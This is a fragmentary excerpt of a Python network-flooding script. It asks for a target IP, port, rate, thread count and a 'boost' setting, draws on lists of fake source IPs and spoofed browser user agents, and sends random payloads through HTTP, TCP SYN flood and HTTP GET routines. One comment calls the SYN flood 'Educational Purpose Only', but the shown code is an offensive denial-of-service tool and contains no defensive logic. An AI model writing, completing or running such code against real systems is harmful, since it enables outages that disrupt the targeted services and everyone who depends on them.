...
fake_ips = ['192.165.6.6', '192.176.76.7', '192.156.6.6', '192.155.5.5', '192.143.2.2', '188.142.41.4', '187.122.12.1', '192.153.4.4', '192.154.32.4', '192.153.53.25', '192.154.54.5', '192.143.43.4', '192.165.6.9', '188.154.54.3']
user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
...
try:
    target_ip = input(f"\033[1;37mIP Target : ")
    target_port = int(input("Port : "))
    bytes_per_sec = int(input("Bytes Per Sec : "))
    thread_count = int(input("Thread : "))
    use_boost = input("Use Boost ? Y/N : ").lower() 
...
    if use_boost == 'y':
        effective_bytes_per_sec = bytes_per_sec + 500
    else:
        effective_bytes_per_sec = bytes_per_sec 
...
                    payload = random._urandom(512)  # 더 작은 페이로드 크기
                    send_iterations = effective_bytes_per_sec // 512 + 1
...
                        logging.error(f"[HTTP] General error: {e}") 

                # TCP SYN Flood (Requires Root/Admin, Educational Purpose Only)
                try:
...
                except Exception as e:
                    logging.error(f"[TCP SYN] Error sending SYN packet: {e}") 

                # Basic HTTP GET with Requests
                try:
